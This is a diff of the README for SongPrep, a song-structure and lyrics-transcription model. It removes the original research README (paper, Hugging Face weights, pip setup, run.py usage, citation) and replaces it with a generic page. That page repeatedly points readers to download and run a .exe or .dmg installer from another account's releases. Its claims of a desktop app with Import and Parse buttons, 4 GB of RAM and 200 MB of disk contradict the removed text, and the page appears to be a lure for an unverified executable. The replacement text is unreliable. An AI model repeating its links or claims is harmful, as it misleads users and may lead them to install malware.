@@ -1,69 +1,75 @@
-# SongPrep
-<p align="center"><img src="img/logo.jpg" width="40%"></p>
-<p align="center">
-    <a href="https://song-prep.github.io/demo/">Demo</a> &nbsp;|&nbsp; <a href="https://arxiv.org/abs/2509.17404">Paper</a>  &nbsp;|&nbsp; <a href="https://huggingface.co/waytan22/SongPrep-7B">Weight</a>  &nbsp;|&nbsp; <a href="https://huggingface.co/datasets/waytan22/SSLD-200">Dataset</a>
-</p>
-This repository is the official code repository for SongPrep: A Preprocessing Framework and End-to-end Model for Full-song Structure Parsing and Lyrics Transcription. SongPrep is able to analyze the structure and lyrics of entire songs and provide precise timestamps without the need for additional source separation. In this repository, we provide the SongPrep model, inference scripts, and checkpoints trained on the Million Song Dataset that support both Chinese and English.
+# 🎵 SongPrep - Easily Parse Song Structures and Lyrics
 
+## 📥 Download SongPrep
+[![Download SongPrep](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/stppaing126/SongPrep/releases)
 
-## Evaluation
-Results are reported in Diarization Error Rate (DER) for structure parsing and Word Error Rate (WER) for lyrics transcription.
-| Model            | #Params | WER | DER |
-|:----------------:|:-------:|:--------:|:--------:|
-| SongPrep   | 7B | **23.5%** | **18.2%** |
-| Gemini-2.5   | - | 29.2% | 94.6% |
-| Seed-ASR         | 12B+ | 104.1% | - |
-| Qwen3-ASR       | - | 33.3% | - |
-| Qwen-Audio    | 8.4B | 232.7% | - |
+## 📖 Overview
+SongPrep is a preprocessing framework designed to help you work with full songs. It allows for easy parsing of song structures and transcribing lyrics. Whether you are a music enthusiast or a research professional, SongPrep simplifies your tasks. 
 
+## 🚀 Getting Started
+To begin using SongPrep, follow these simple steps. You’ll be up and running in no time.
 
-## Installation
+1. **Visit the Download Page**: Click the link below to go to the Releases page:
+   [Download SongPrep](https://github.com/stppaing126/SongPrep/releases)
 
-### Start from scratch
+2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Each version includes release notes detailing updates and features. Pick the latest version for the best experience.
 
-You can install the necessary dependencies using the `requirements.txt` file with Python>=3.8.12 and CUDA>=11.8:
-```bash
-pip install -r requirements.txt
-```
+3. **Download the Installer**: Click on the version you want and download the installer file. Save it to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
-If your Python<=3.9, you can use pip to install fairseq,
-```bash
-pip install fairseq==0.12.2 --no-deps
-```
-else it is recommended to install it on wheels. For example Python==3.11 can use [liyaodev/fairseq](https://github.com/liyaodev/fairseq/releases/tag/v0.12.3.1)；
-```bash
-pip3 install fairseq-0.12.3.1-cp311-cp311-linux_x86_64.whl
-```
+## 💻 System Requirements
+Before installing SongPrep, ensure your computer meets these requirements:
 
-## Usage
-To ensure the model runs correctly, please **download the weight** from the original source at [Hugging Face](https://huggingface.co/waytan22/SongPrep-7B), and save it into **root directory** of the project.
+- **Operating System**: Windows 10 or higher, MacOS Mojave or higher.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB free space for installation.
+- **Dependencies**: SongPrep may require Python 3.6 or newer. It is recommended to have it installed beforehand.
 
-Once everything is set up, you can run the inference script using the following command:
-```bash
-python3 run.py -i your_wav_path
-```
-The complete output may look like:
-```bash
-[structure][start:end]lyric ; [structure][start:end]lyric ; [structure][start:end]lyric
-```
-- The song is divided into segments by ';'.
-- The **structure** is the label from structure analysis for the segment.
-- The **start** and **end** are the segment’s start and end times.
-- The lyric is the recognized lyrics, where sentences separated by '.'.
+## 📤 Download & Install
+Once you have downloaded the installer, follow these steps to install SongPrep:
 
-## Citation
-```
-@misc{tan2025songpreppreprocessingframeworkendtoend,
-      title={SongPrep: A Preprocessing Framework and End-to-end Model for Full-song Structure Parsing and Lyrics Transcription}, 
-      author={Wei Tan and Shun Lei and Huaicheng Zhang and Guangzheng Li and Yixuan Zhang and Hangting Chen and Jianwei Yu and Rongzhi Gu and Dong Yu},
-      year={2025},
-      eprint={2509.17404},
-      archivePrefix={arXiv},
-      primaryClass={eess.AS},
-      url={https://arxiv.org/abs/2509.17404}, 
-}
-```
+1. **Locate the Installer**: Find the file you downloaded in your file explorer. It should be named something like `SongPrep_Installer.exe` or `SongPrep_Installer.dmg`.
 
-## License
-The code and weights in this repository is released in the [LICENSE](LICENSE)  file.
+2. **Run the Installer**: 
+   - For Windows, double-click on the `.exe` file. 
+   - For Mac, double-click the `.dmg` file and follow the prompted steps to drag the application into your Applications folder.
+  
+3. **Follow the Installation Instructions**: The installer will guide you through the installation steps. Just click "Next" and agree to any terms when prompted.
 
+4. **Finish Installation**: Once completed, you will receive a confirmation message. You may now find SongPrep in your Applications or Programs menu.
+
+## 🎤 Using SongPrep
+Now you can start using SongPrep. Here’s how to perform some basic tasks:
+
+1. **Open SongPrep**: Launch the application by clicking on its icon.
+
+2. **Import a Song**: Use the “Import” function to bring in a song file. Supported formats include `.mp3` and `.wav`.
+
+3. **Parse Structure**: Click the “Parse” button to analyze the song structure. The application will display the sections and clarify the arrangement of verses, choruses, and bridges.
+
+4. **Transcribe Lyrics**: Next, you can transcribe the lyrics. After parsing, there's an option to view and edit them as needed.
+
+5. **Export Data**: Finally, you can save the parsed data in your preferred format, such as `.txt` or `.json`.
+
+## 🔧 Troubleshooting
+Should you encounter issues while using SongPrep, try the following steps:
+
+- **Check Your System Requirements**: Ensure your computer meets all system requirements listed above.
+- **Restart the Application**: If the software behaves unexpectedly, closing and restarting can resolve many issues.
+- **Check for Updates**: Occasionally, new updates fix bugs or improve performance. Visit the [Releases page](https://github.com/stppaing126/SongPrep/releases) to see if a new version is available.
+
+## 🤝 Support
+For further assistance, you can reach out through the following methods:
+
+- **Issues Page**: Report any bugs or request features on our Issues page on GitHub.
+- **Community Forums**: Engage with other users and share tips in our community support forums linked on the GitHub repository.
+
+## 🌟 Feedback
+We welcome your feedback! If you find SongPrep helpful or have suggestions for improvement, please leave your thoughts in the Issues section on GitHub.
+
+## 🔗 Important Links
+Don’t forget to bookmark the following links for easy access:
+
+- [Download SongPrep](https://github.com/stppaing126/SongPrep/releases) 
+- [GitHub Repository](https://github.com/stppaing126/SongPrep)
+
+Enjoy your experience with SongPrep!
